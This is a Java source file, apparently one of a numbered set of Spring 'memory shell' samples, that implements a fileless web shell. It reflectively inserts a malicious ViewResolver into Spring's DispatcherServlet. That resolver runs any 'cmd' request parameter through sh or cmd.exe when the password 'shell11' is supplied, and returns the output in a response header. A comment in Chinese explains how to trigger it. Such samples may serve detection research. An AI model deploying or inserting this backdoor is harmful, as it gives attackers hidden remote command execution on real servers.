package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.http.MediaType;
import org.springframework.lang.Nullable;
import org.springframework.util.Assert;
import org.springframework.util.StringUtils;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.SmartView;
import org.springframework.web.servlet.View;
import org.springframework.web.servlet.ViewResolver;

import java.io.InputStream;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Scanner;

// 需要访问一个不存在的 url 才可以触发，注意命令执行请求的时候的 Accept 头必须是以下
// text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
public class No11_ViewResolverShell implements ViewResolver {
    public static String injectShell() throws IllegalAccessException {
        DispatcherServlet servlet = new Util().getServlet();
        List<ViewResolver> viewResolvers = (List<ViewResolver>) Util.getFieldValue(servlet,"viewResolvers");
        viewResolvers.add(0,new No11_ViewResolverShell());

        return "{\"result\":\"No11_ViewResolverShell\"}";
    }

    protected final Log logger = LogFactory.getLog(getClass());
    private boolean useNotAcceptableStatusCode = false;

    // exec
    @Override
    public View resolveViewName(String viewName, Locale locale) throws Exception {
        RequestAttributes attrs = RequestContextHolder.getRequestAttributes();
        HttpServletRequest request = ((ServletRequestAttributes) attrs).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) attrs).getResponse();

        String passwd = request.getParameter("pass");
        String cmd = request.getParameter("cmd");
        if (passwd!=null && cmd!=null && passwd.equals("shell11") && !cmd.isEmpty()){
            boolean islinux = true;
            String osType = System.getProperty("os.name");
            if (osType !=null && osType.toLowerCase().contains("win")){
                islinux = false;
            }
            String[] cmds = islinux ? new String[]{"sh","-c",request.getParameter("cmd")} : new String[]{"cmd.exe","/c",request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.setHeader("Exec-result",new String(output));
        }

//        RequestAttributes attrs = RequestContextHolder.getRequestAttributes();
        Assert.state(attrs instanceof ServletRequestAttributes, "No current ServletRequestAttributes");
        List<MediaType> requestedMediaTypes = getMediaTypes(((ServletRequestAttributes) attrs).getRequest());
        if (requestedMediaTypes != null) {
            List<View> candidateViews = getCandidateViews(viewName, locale, requestedMediaTypes);
            View bestView = getBestView(candidateViews, requestedMediaTypes, attrs);
            if (bestView != null) {
                return bestView;
            }
        }

        String mediaTypeInfo = logger.isDebugEnabled() && requestedMediaTypes != null ?
                " given " + requestedMediaTypes.toString() : "";

        if (this.useNotAcceptableStatusCode) {
            if (logger.isDebugEnabled()) {
                logger.debug("Using 406 NOT_ACCEPTABLE" + mediaTypeInfo);
            }
            return NOT_ACCEPTABLE_VIEW;
        }
        else {
            logger.debug("View remains unresolved" + mediaTypeInfo);
            return null;
        }


    }

    private static final View NOT_ACCEPTABLE_VIEW = new View() {

        @Override
        @Nullable
        public String getContentType() {
            return null;
        }

        @Override
        public void render(@Nullable Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) {
            response.setStatus(HttpServletResponse.SC_NOT_ACCEPTABLE);
        }
    };

    private View getBestView(List<View> candidateViews, List<MediaType> requestedMediaTypes, RequestAttributes attrs) {
        for (View candidateView : candidateViews) {
            if (candidateView instanceof SmartView smartView) {
                if (smartView.isRedirectView()) {
                    return candidateView;
                }
            }
        }
        for (MediaType mediaType : requestedMediaTypes) {
            for (View candidateView : candidateViews) {
                if (StringUtils.hasText(candidateView.getContentType())) {
                    MediaType candidateContentType = MediaType.parseMediaType(candidateView.getContentType());
                    if (mediaType.isCompatibleWith(candidateContentType)) {
                        mediaType = mediaType.removeQualityValue();
                        if (logger.isDebugEnabled()) {
                            logger.debug("Selected '" + mediaType + "' given " + requestedMediaTypes);
                        }
                        attrs.setAttribute(View.SELECTED_CONTENT_TYPE, mediaType, RequestAttributes.SCOPE_REQUEST);
                        return candidateView;
                    }
                }
            }
        }
        return null;
    }

    private List<View> getCandidateViews(String viewName, Locale locale, List<MediaType> requestedMediaTypes) {
        return null;
    }

    private List<MediaType> getMediaTypes(HttpServletRequest request) {
        return null;
    }
}
